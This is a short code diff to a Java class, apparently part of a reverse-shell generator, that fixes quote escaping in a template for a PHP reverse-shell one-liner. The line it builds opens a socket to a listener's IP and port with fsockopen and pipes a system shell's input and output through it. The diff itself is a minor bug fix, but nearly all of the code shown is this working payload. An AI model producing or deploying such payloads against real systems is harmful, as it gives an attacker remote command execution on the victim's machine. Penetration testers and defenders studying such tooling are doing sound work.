@@ -8,7 +8,7 @@ public class Php__ extends Reverse {
 
     public Php__(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("php -r '$sock=fsockopen(\\\"%s\\\",%s);`%s <&3 >&3 2>&3`;'", this.getLocalIP(), this.getLocalPort(), this.getShell());
+        shellFormat = String.format("php -r '$sock=fsockopen(\"%s\",%s);`%s <&3 >&3 2>&3`;'", this.getLocalIP(), this.getLocalPort(), this.getShell());
     }
 
     @Override
